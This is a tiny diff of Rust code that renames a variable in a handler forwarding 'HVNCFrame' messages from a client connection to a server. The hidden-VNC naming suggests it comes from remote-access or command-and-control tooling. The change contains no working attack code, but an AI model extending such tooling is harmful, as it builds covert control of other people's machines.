@@ -180,8 +180,8 @@ impl ClientReaderWrapper {
                     .await;
             }
 
-            HVNCFrame(frame_data) => {
-                self.send_server_packet(ServerCommand::HVNCFrame(self.addr, frame_data))
+            HVNCFrame(frame) => {
+                self.send_server_packet(ServerCommand::HVNCFrame(self.addr, frame))
                     .await;
             }
 
